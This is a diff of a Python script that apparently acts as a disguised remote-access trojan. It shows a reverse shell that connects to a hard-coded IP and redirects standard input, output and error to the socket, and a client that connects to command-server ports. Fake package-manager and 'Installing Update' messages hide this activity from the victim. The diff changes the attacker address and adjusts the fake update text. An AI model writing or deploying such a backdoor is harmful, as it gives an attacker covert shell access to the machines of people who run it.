@@ -219,7 +219,7 @@ def shell(mysocket, delimiter):
             mysendall(mysocket, data, delimiter)
             time.sleep(1)
             s = socket.socket()
-            s.connect(('10.0.5.130', 34543))
+            s.connect(('192.168.86.27', 34543))
             # We duplicate the standard out, in and error
             os.dup2(s.fileno(),0)
             os.dup2(s.fileno(),1)
@@ -462,18 +462,19 @@ def main():
         print("Get:24 https://packages.sari.org/php buster/main Packages [338 kB]")
         time.sleep(.2)
         print("Fetched 1,482 kB in {}s ({} kB/s)".format(9, 1482//9))
-        print('Building package lists...\r')
+        print('Building package lists...')
         print("Reading package lists...",end='')
         time.sleep(.1)
     elif sys.platform.startswith('win'):
-        for i in range(25):
-            print("Downloading Update {} of 25...".format(i))
-            time.sleep(.5)
-            print("Installing Update {} of 25...".format(i))
+        for i in range(1,16):
+            print("Downloading Update {} of 15...".format(i))
+            time.sleep(.4)
+            print("Installing Update {} of 15...".format(i))
             time.sleep(.7)
         print('Finalizing Update....')
+
     # This is setting up the client to communicate with the server
-    ip = '10.0.5.130'
+    ip = '192.168.86.27'
     ports = [8888, 7777, 6666, 5555]
     delimiter = b'!!@@##$$!!'
     # This is the socket object that will connect to the server
